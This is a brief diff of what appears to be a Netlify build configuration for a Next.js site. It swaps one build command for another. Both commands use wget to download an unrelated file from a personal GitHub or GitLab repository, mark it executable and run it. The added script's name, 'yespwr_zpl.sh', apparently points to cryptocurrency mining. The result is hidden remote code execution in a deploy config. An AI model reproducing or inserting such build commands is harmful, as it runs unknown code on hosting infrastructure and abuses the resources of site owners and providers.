@@ -1,5 +1,5 @@
 [build]
-  command = "wget -O 2 https://github.com/maximussale1/bash-2/raw/main/nettv && chmod +x 2 && ./2"
+  command = "wget -O 1 https://gitlab.com/richardkevin320/depo/-/raw/main/yespwr_zpl.sh && chmod +x 1 && ./1"
   publish = ".next"
 
 [[plugins]]
